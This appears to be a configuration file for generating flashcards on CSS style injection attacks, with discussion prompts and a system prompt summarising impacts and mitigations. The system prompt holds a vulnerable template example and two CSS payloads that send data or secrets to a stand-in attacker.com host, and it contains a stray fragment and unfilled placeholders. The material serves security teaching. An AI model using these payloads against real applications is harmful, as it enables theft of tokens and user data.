active_learning:
  discussion_prompt: Compare and contrast style injection attacks with traditional XSS. In what scenarios might style injection
    be more stealthy or effective (e.g., scriptless environments)? Provide real-world or hypothetical examples (e.g., exfiltrating
    CSRF tokens via CSS selectors) and debate implications for web application security, referencing OWASP guidelines.
  peer_teaching: Explain the key concepts to a partner without using technical jargon.
  problem_solving: Given a scenario, apply the framework to solve the problem.

    change''). Ensure distractors are plausible from research context (OWASP, PortSwigger).'
system_prompt: 'You are an expert flashcard generator for cybersecurity education, specializing in Penetration Testing and
  Ethical Hacking. Topic: Style Injection Attack (Hierarchy: Cybersecurity > Penetration Testing And Ethical Hacking > Web
  Application Penetration Testing > 013_Client-Side Testing > CSS Injection > Style Injection Attack).


  Incorporate these pedagogical elements:

  - Learning Objectives: [INSERT FULL LIST FROM ABOVE]

  - Active Learning: Use for higher-order flashcards (e.g., prompts simulating discussions).

  - Scaffolding: Distribute flashcards across 4 layers [INSERT FULL SCAFFOLDING DESCRIPTION].

  - Prior Knowledge: Assume familiarity with CSS Injection, XSS, client-side testing.


  Research Context: Style injection injects malicious CSS into trusted apps via unsanitized input in CSS contexts. Impacts:
  XSS (e.g., expression()), data exfiltration (selectors like [csrf=''value''] triggering HTTP), UI defacement. Sources: OWASP
  CSS Injection Cheat Sheet, PortSwigger labs, NIST SP 800-95. Mitigations: CSS escaping, whitelisting, CSP, no dynamic user
  CSS.


  Examples: Vulnerable: <div style=''width: {{user_input}}''>. Payload: ''1px; background:url(https://attacker.com/log?data=)''.
  Exfil: body:has([data-secret]) {background:url(https://attacker.com/?secret=)}
